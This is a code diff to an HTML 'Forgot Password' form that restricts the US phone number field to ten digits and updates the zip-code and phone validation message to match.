@@ -67,7 +67,6 @@
 <body>
     <div class="container">
 
-        <!-- Step 0: Company + User ID -->
         <div id="step0" class="step active">
             <h1>Forgot Password</h1>
             <p>Select your company and enter your User ID</p>
@@ -131,8 +130,9 @@
             <label>Zip Code</label>
             <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
 
-            <label>Phone Number</label>
-            <input type="tel" id="phone" placeholder="(123) 456-7890" required>
+            <label>Phone Number (US)</label>
+            <input type="tel" id="phone" maxlength="10" placeholder="1234567890" 
+                   oninput="this.value = this.value.replace(/[^0-9]/g,'')" required>
 
             <button class="continue" onclick="saveStep2()">Continue</button>
         </div>
@@ -215,8 +215,8 @@
             const zip = document.getElementById('zip').value.trim();
             const phone = document.getElementById('phone').value.trim();
 
-            if (zip.length !== 5 || !phone) {
-                alert("Please enter valid Zip Code and Phone Number.");
+            if (zip.length !== 5 || phone.length !== 10) {
+                alert("Please enter valid Zip Code (5 digits) and Phone Number (10 digits).");
                 return;
             }
 
